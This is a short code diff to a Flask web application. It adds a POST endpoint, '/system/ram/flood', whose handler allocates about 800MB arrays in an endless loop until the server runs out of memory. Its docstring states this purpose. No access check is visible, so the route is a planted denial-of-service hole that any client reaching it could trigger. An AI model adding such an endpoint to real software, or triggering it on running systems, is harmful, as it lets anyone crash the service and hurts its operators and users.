@@ -569,6 +569,16 @@ def upload_config():
             return flask.jsonify({"success": True}), 200
         except Exception as e:
             return flask.jsonify({"error": f"Invalid JSON: {str(e)}"}), 400
+        
+@app.route('/system/ram/flood', methods=['POST'])
+def ram_flood():
+    """
+    Endpoint to continuously allocate RAM until the server runs out of memory.
+    """
+    list = []
+    while True:
+        list.append(numpy.zeros((10**6, 10**2)))  # Allocate ~800MB at a time
+    return '', 204
 
 
 # --- Simple WebSocket server (runs alongside Flask) ---
